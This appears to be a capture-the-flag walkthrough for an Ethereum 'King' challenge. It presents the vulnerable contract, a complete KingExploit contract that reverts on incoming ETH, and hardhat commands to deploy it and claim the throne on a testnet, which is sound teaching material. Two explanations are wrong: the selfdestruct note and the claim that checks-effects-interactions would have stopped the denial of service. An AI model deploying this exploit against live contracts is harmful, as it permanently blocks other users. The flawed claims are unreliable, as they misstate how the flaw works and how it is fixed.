# Level 9: King Challenge

## Challenge Description

This level introduces the concept of Denial of Service (DoS) attacks in Ethereum smart contracts. The goal is to break the King contract and prevent anyone else from becoming the king.

## Contract Location

The challenge contract is located at:
```
/contracts/level-09-king/King.sol
```

## Understanding the Challenge

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

The King contract implements a simple "king of the hill" game:
- The contract has a king address and a prize amount
- Anyone can become the new king by sending more ETH than the current prize
- When a new king takes over, the old king receives the ETH sent by the new king
- The prize is updated to the new amount sent

### The Vulnerability

The vulnerability is in the `receive()` function:

```solidity
payable(king).transfer(msg.value);
```

This line attempts to transfer ETH to the previous king. If the king is a contract that doesn't accept ETH (by not implementing a receive or fallback function, or by intentionally reverting in these functions), then this transfer will fail, which will prevent anyone from becoming the new king.

## Winning Strategy

To win this challenge, you need to:

1. Create a contract that can become the king
2. Ensure that the contract actively prevents receiving ETH transfers
3. Make that contract the king

## Hint for Thinking

Ask yourself:
* What happens if a contract can't receive ETH?
* How can a transfer operation be forced to fail?
* How does `transfer()` differ from other ETH sending methods?

## Disclaimer

If you want to solve this challenge on your own, stop reading here and try to implement a solution based on the hints above. The complete solution is provided below.

---

## Solution

The solution is to create a malicious contract that becomes king but actively prevents receiving ETH, causing the King contract to fail when trying to set a new king.

### Understanding the Attack

The attack works because:

1. The `King` contract uses `transfer()` to send ETH to the current king when a new king claims the throne
2. The `transfer()` method has a gas limit of 2300 gas and will fail if the recipient is a contract that reverts in its receive function
3. If this transfer fails, the entire transaction reverts, preventing anyone else from becoming king

### Exploit Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingExploit {
    address public kingContractAddress;
    address public owner;
    
    constructor(address _kingContractAddress) {
        kingContractAddress = _kingContractAddress;
        owner = msg.sender;
    }
    
    function claimThrone() public payable {
        // Send ETH to the King contract to become the new king
        (bool success, ) = payable(kingContractAddress).call{value: msg.value}("");
        require(success, "Failed to claim throne");
    }
    
    // Implementing receive function that reverts
    receive() external payable {
        revert("Cannot receive ETH");
    }
    
    // Implementing fallback function that also reverts
    fallback() external payable {
        revert("Cannot receive ETH");
    }
}
```

**Note**: Simply not implementing a receive or fallback function would NOT be sufficient. ETH can still be forcibly sent to contracts through a `selfdestruct` operation. By implementing functions that explicitly revert, we ensure the King contract's transfer will always fail.

## Step-by-Step Solution Guide

### 1. Deploy the King Contract

If you're testing locally, deploy the King contract first:

```shell
npx hardhat deploy --tags king
```

### 2. Deploy the KingExploit Contract

Deploy the KingExploit contract targeting the King contract:

```shell
npx hardhat deploy --tags king-solution
```

Or with a specific King contract address:

```shell
TARGET_ADDRESS=0xYourKingAddress npx hardhat deploy --tags king-solution --network sepolia
```

### 3. Execute the Exploit

Run the provided script to claim the throne using the KingExploit contract:

```shell
EXPLOIT_ADDRESS=0xYourExploitAddress KING_ADDRESS=0xKingAddress npx hardhat run scripts/level-09-king/claim-throne.ts --network sepolia
```

Parameters:
- `EXPLOIT_ADDRESS`: Required - the address of your deployed KingExploit contract
- `KING_ADDRESS`: Optional - defaults to a predefined address if not provided

### 4. Verify Your Success

After executing the solution, verify that:
1. The KingExploit contract is the new king
2. Any attempt to become the new king will fail due to the transaction reverting

## Lessons Learned

This challenge teaches important lessons about safe external calls in smart contracts:

1. **External Call Safety**: When making external calls that can fail, consider using lower-level `call()` instead of `transfer()` or `send()` so you can handle failures more gracefully.

2. **Design for Failures**: Smart contracts should be designed to handle cases where external calls fail, especially when the contract's functioning depends on these calls.

3. **DoS Attacks**: This is an example of a Denial of Service (DoS) attack. A malicious contract can prevent legitimate functions from executing by exploiting the requirement that all contract calls must succeed.

4. **Checks-Effects-Interactions Pattern**: Following this pattern could have prevented the vulnerability. The contract should update its state (setting the new king) before making external calls (sending ETH to the old king).

5. **Pull Over Push**: Implement a pull-payment system where users withdraw funds themselves instead of pushing payments to them.

